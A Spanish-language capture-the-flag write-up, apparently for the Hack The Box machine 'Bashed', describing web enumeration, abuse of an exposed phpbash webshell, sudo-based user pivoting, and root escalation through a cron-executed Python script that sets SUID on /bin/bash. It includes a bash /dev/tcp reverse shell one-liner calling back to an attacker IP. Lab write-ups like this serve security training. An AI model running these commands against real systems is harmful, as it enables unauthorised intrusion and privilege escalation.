## Bashed

---

![image](images/20250523112750.png)

###### Técnicas demostradas:

- Web Enumeration
- Abusing WebShell Utility (RCE)
- Abusing Sudoers Privilege (User Pivoting)
- Detecting Cron Jobs Running on the System
- Exploiting Cron Job Through File Manipulation in Python Executed by Root (Privilege Escalation)

---

Realizamos un escaneo de puertos con la herramienta `nmap`

```bash
nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 10.10.10.68 -oG allPorts
```

![image](images/20250430104350.png)

Hacemos un escaneo exhaustivo sobre el puerto encontrado para conocer el servicio y su versión.

```bash
nmap -p80 -sCV 10.10.10.68 -oN targeted
```

![image](images/20250430104436.png)

Con la herramienta `WhatWeb` obtenemos algo más de información

```bash
whatweb 10.10.10.68
```

![image](images/20250430104518.png)

Accedemos a la web para ver qué encontramos.

![image](images/20250430104900.png)

Realizamos una búsqueda de directorios dentro del dominio con la herramienta `gobuster`

```bash
gobuster dir -u http://10.10.10.68 -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -t 20 --add-slash -x php
```

![image](images/20250430110543.png)

Tras probar varios, vemos que `/dev` nos permite acceder a la herramienta `phpbash` --> [GitHub - Arrexel/phpbash: A semi-interactive PHP shell compressed into a single file.](https://github.com/Arrexel/phpbash)

![image](images/20250430110555.png)

Accedemos a ella, y vemos que podemos ejecutar comandos como el usuario `www-data`

![image](images/20250430110640.png)

Moviéndonos al directorio personal de `arrexel` encontramos la primera flag

![image](images/20250430110749.png)

#### Escalada de privilegios

Empezamos listando los permisos a nivel de `sudoers` para el usuario `www-data`

```bash
sudo -l
```

Vemos que podemos ejecutar comandos como el usuario `scriptmanager` sin necesidad de contraseña

![image](images/20250430110905.png)

Podemos probar esto de la siguiente manera:

```bash
sudo -u scriptmanager whoami
```

![image](images/20250430112917.png)

En este punto, lanzamos una reverse shell a nuestra máquina para trabajar más cómodamente.

```bash
bash -c "bash -i >%26 /dev/tcp/10.10.14.9/1234 0>%261"
```

```bash
nc -nlvp 1234
```

![image](images/20250430113217.png)

Y lanzamos una bash como `scriptmanager`:

```bash
sudo -u scriptmanager bash
```

![image](images/20250430113343.png)

Buscamos archivos cuyo propietario sea `scriptmanager`

```bash
find / -user scriptmanager 2>/dev/null | grep -v "proc"
```

![image](images/20250430113834.png)

Encontramos archivos dentro del directo `/script`

```bash
cd scripts/
```

![image](images/20250430113847.png)

Revisando su contenido y permisos, parece que el usuario root está ejecutando una tarea programada:

![image](images/20250430114030.png)

Con el siguiente script podemos visualizar en tiempo real si se están ejecutando tareas y el usuario que las lanza:

![image](images/20250430120902.png)

```sh
#!/bin/bash

old_process="$(ps -eo user,command)"

while true; do
	new_process="$(ps -eo user,command)"
	diff <(echo "$old_process") <(echo "$new_process") | grep "[\>\<]" | grep -vE "kworker|procmon"
	old_process=$new_process
done
```

```bash
chmod +x procmon.sh
```

![image](images/20250430115137.png)

Una vez confirmado que se ejecuta como root, modificamos el archivo `test.py` para asignar el bit `SUID` a `/bin/bash`:

```python
import os

os.system("chmod u+s /bin/bash")
```

![image](images/20250430115825.png)

Y ejecutamos bash con privilegios elevados:

```bash
bash -p
```

Encontramos la flag de root

![image](images/20250430115914.png)
